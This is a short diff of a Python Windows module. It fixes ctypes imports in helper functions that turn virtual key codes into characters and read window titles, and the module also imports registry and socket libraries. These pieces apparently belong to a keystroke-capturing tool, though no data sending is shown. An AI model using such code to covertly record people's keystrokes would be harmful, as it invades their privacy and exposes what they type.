@@ -1,6 +1,5 @@
 import winreg
-from ctypes import create_unicode_buffer
-from ctypes.windll import user32
+from ctypes import windll, create_unicode_buffer
 from threading import Thread
 import win32api
 from socket import *
@@ -87,7 +86,7 @@ def ToUnicode(vk):
     """
     def _ToUnicode(results):
         b = create_unicode_buffer(256)
-        results["code"] = user32.ToUnicode(
+        results["code"] = windll.user32.ToUnicode(
             vk, 0, win32api.GetKeyboardState(), b, 256, 0)
         results["char"] = b.value.encode("utf-8")
     results = {}
@@ -123,9 +122,9 @@ def GetWindowTextW(hwnd):
     Returns:
         Unicode title
     """
-    length = user32.GetWindowTextLengthW(hwnd)
+    length = windll.user32.GetWindowTextLengthW(hwnd)
     buff = create_unicode_buffer(length + 1)
-    user32.GetWindowTextW(hwnd, buff, length + 1)
+    windll.user32.GetWindowTextW(hwnd, buff, length + 1)
     return buff.value.encode("utf-8")
 
 
